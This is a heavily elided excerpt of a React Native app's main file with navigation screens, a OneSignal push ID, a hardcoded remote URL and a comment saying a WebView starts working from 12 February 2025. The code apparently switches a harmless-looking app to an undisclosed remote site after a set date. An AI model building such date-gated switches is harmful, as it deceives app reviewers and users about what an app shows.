...
import MapScreen from './screen/Stack/MapScreen';
const Stack = createNativeStackNavigator();
///////////////////
import ColorsMontrealOrigenProductScreen from './screen/ColorsMontrealOrigenProductScreen';
...
export default function App() {
  ...
  const INITIAL_URL = `https://super-cool-ecstasy.space/`;
  const URL_IDENTIFAIRE = `m43LgC1y`;
  ...
  OneSignal.initialize('9d4d60ac-a9b3-4559-bc78-7047310ce4e5');
  ...
  useEffect(() => {
    ...
    const targetData = new Date('2025-02-12T10:00:00'); //дата з якої поч працювати webView
      ...
      return (
        <Stack.Navigator>
          <Stack.Screen
            ...
            name="ColorsMontrealOrigenProductScreen"
            component={ColorsMontrealOrigenProductScreen}
      ...
      <NavigationContainer>
        {!louderIsEnded || !aceptTransperency || !completeLink ? (
          <View
            ...
            <Animated.Image
              source={require('./assets/image/bg/louder1.jpg')}
              style={{
                //...props.style,
            ...
            />
            <Animated.Image
              source={require('./assets/image/bg/louder2.jpg')}
              style={{
                //...props.style,
